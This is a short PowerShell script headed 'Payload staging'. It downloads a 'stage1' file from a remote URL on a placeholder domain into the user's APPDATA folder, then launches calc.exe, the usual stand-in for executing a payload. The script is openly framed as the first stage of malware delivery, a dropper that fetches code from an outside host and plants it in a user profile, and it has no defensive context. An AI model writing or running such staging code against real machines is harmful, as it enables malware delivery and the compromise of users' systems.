<# Payload staging #>
[CmdletBinding()]
param(
    [string]$Stage1Url = 'http://contoso.com/update.dat',
    [string]$OutputPath = "$env:APPDATA\stage1.bin"
)
(New-Object System.Net.WebClient).DownloadFile($Stage1Url, $OutputPath)
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
